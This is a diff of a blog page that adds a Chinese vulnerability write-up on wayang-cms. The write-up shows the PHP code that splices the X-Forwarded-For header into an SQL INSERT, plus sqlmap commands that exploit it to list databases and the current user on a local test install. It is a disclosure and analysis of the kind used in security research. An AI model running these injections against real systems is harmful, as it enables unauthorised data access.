@@ -4,7 +4,7 @@
 <meta name="description" content=""/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
 
-<title>metasploit从入门到精通 | lowliness9的博客</title>
+<title>wayang-cms SQL注入漏洞 | lowliness9的博客</title>
 
 <link rel="shortcut icon" href="https://lowliness9.github.io/favicon.ico?v=1605356357147">
 
@@ -89,21 +89,51 @@
         <div class="post-detail gt-bg-theme-color-second">
             <article class="gt-post-content">
                 <h2 class="post-title">
-                    metasploit从入门到精通
+                    wayang-cms SQL注入漏洞
                 </h2>
                 <div class="post-info">
                     <time class="post-time gt-c-content-color-first">
-                        · 2020-03-03 ·
+                        · 2019-01-02 ·
                     </time>
                     
-                        <a href="https://lowliness9.github.io/tag/eCLY9oJE-6/" class="post-tags">
-                            # metasploit
+                        <a href="https://lowliness9.github.io/tag/N9c4F8SF6/" class="post-tags">
+                            # 代码审计
                         </a>
                     
                 </div>
                 <div class="post-content">
-                    <h3 id="待续">待续</h3>
-<figure data-type="image" tabindex="1"><img src="https://lowliness9.github.io/post-images/1599969288209.jpg" alt="" loading="lazy"></figure>
+                    <h3 id="1wayang-cms官方下载地址">1.wayang-cms官方下载地址</h3>
+<p>github官方下载，<a href="https://github.com/ketutd/wayang-cms">wayang-cms</a></p>
+<h3 id="2搭建复现环境">2.搭建复现环境</h3>
+<p>下载并安装phpStudy，下载wayang-cms并将里面所有文件全部复制到phpStudy的web目录，连接mysql并创建新的数据库wayang-cms，启动Apache访问 <code>http://127.0.0.1/wy_install/</code>进行安装设置，安装完成将wy_install中的cms.sql导入到数据库即可，成功运行如下：<br>
+<img src="https://lowliness9.github.io/post-images/1605356266145.png" alt="" loading="lazy"></p>
+<h3 id="3漏洞分析">3.漏洞分析</h3>
+<p>漏洞产生的原因在于系统在记录访客IP的时候对访客的IP地址未进行任何安全验证，将用户传入的数据直接拼接到SQL语句当中执行。<br>
+漏洞产生的位置在<code>wy_controlls/wy_side_visitor.php</code>的第8行到10行，第8行代码中将访问系统的用户的IP地址、浏览器、时间等使用<code>Insert</code>关键字拼接SQL语句，此代码使用ip()方法获取访客的IP地址。<br>
+<img src="https://lowliness9.github.io/post-images/1605352424803.png" alt="" loading="lazy"><br>
+定位到ip()方法的文件查看具体实现，此方法位于<code>wy_controlls/wy_side_visitor.php</code>中，通过代码可以看到如果HTTP请求头中有X-Forwarded-For等字段将直接从HTTP请求头中取值并return。<br>
+<img src="https://lowliness9.github.io/post-images/1605352606597.png" alt="" loading="lazy"><br>
+攻击者可以提交脏数据进行恶意的SQL注入。</p>
+<pre><code class="language-php">$queryi=&quot;INSERT INTO `wy_visitor`(`visitor_ipaddress`, `visitor_user_agent`, `visitor_date`, `visitor_online`, `visitor_online_status`) 
+  VALUES ('&quot;.ip().&quot;','&quot;.$browser.&quot;',CURDATE(),CURRENT_TIMESTAMP,1) ON DUPLICATE KEY UPDATE `visitor_online`=CURRENT_TIMESTAMP, `visitor_online_status`=1&quot;;
+$row=$conn-&gt;query($queryi);
+</code></pre>
+<h3 id="4漏洞证明">4.漏洞证明</h3>
+<p>使用的工具为sqlmap、burpsuite。访问网站首页并进行抓包，并添加X-Forwarded-For: 8.8.8.8字段，在8.8.8.8后面添加*号其目的是为了让sqlmap识别注入点。<br>
+<img src="https://lowliness9.github.io/post-images/1605354299986.png" alt="" loading="lazy"><br>
+将数据包保存为vul.txt并使用sqlmap进行验证，执行如下命令。</p>
+<pre><code>python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 
+</code></pre>
+<p><img src="https://lowliness9.github.io/post-images/1605354487105.png" alt="" loading="lazy"><br>
+尝试获取系统的数据库名称</p>
+<pre><code>python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 --dbs
+</code></pre>
+<p><img src="https://lowliness9.github.io/post-images/1605354592521.png" alt="" loading="lazy"><br>
+尝试获取数据库当前用户</p>
+<pre><code>python2 sqlmap.py -r vul.txt --batch -v 3 --risk 3 --level 5 --current-user
+</code></pre>
+<p><img src="https://lowliness9.github.io/post-images/1605355125688.png" alt="" loading="lazy"><br>
+通过测试发现漏洞真实存在可被利用。</p>
 
                 </div>
             </article>
@@ -112,8 +142,8 @@
         
             <div class="next-post">
                 <div class="next gt-c-content-color-first">下一篇</div>
-                <a href="https://lowliness9.github.io/post/GfCcOU7hX/" class="post-title gt-a-link">
-                    wayang-cms SQL注入漏洞
+                <a href="https://lowliness9.github.io/post/LssrCTO2v/" class="post-title gt-a-link">
+                    wayang-cms 跨站脚本攻击
                 </a>
             </div>
         
